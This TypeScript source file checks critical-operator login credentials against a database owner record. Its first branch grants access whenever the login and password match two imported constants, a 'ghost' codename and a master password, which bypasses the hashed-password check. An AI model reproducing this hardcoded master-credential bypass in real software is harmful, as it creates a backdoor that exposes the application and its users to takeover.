import { prisma } from "@/lib/prisma";
import {
  CROA_GHOST_CODINAME,
  MASTER_REINTEGRATION_PASSWORD,
} from "@/lib/master-password";
import { verifyPassword } from "@/lib/password";

export async function verifyCriticalOperatorAccess({
  login,
  password,
}: {
  login: string;
  password: string;
}) {
  if (login === CROA_GHOST_CODINAME && password === MASTER_REINTEGRATION_PASSWORD) {
    return true;
  }

  const owner = await prisma.member.findFirst({
    where: {
      croaNumber: 1,
    },
    select: {
      accessLogin: true,
      accessPasswordHash: true,
    },
  });

  if (!owner?.accessLogin || !owner.accessPasswordHash) {
    return false;
  }

  return owner.accessLogin === login && verifyPassword(password, owner.accessPasswordHash);
}
